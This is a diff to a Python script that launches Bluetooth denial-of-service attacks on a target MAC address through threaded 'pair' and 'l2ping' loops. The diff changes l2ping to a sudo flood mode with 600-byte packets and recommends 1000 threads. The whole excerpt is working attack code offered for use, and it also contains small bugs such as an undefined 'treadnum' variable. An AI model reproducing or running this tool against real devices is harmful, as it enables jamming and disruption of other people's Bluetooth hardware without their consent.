@@ -21,20 +21,20 @@ elif (cmd == "scan"):
 elif (len(sys.argv) != 4):
     print("methods: pair/l2ping")
     print("utils: scan/on/off")
-    print(sys.argv[0] + " <pair/l2ping> <mac> <threads>")
+    print(sys.argv[0] + " <pair/l2ping> <mac> <threads(recomended:1000)>")
     print(sys.argv[0] + " <scan/on/off>")    
 else:
     method = sys.argv[1]
     macadd = sys.argv[2]
     threadnum = sys.argv[3]
     if (method == "l2ping"):
-        def loopback():
+        def loopbacklping():
             while True: 
-                hwus = run_cmd("l2ping -c 1 -s 700 -t 3 " + macadd) 
+                hwus = run_cmd("sudo l2ping -i %s -s %s -f %s &" % ("hci0", 600, macadd)) 
                 print("sent packet to " + macadd + " size:700")
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
         for i in range(treadnum):
-            threading.Thread(target = loopback).start()
+            threading.Thread(target = loopbacklping).start()
     elif (method == "pair"):
         def loopback():
             while True:
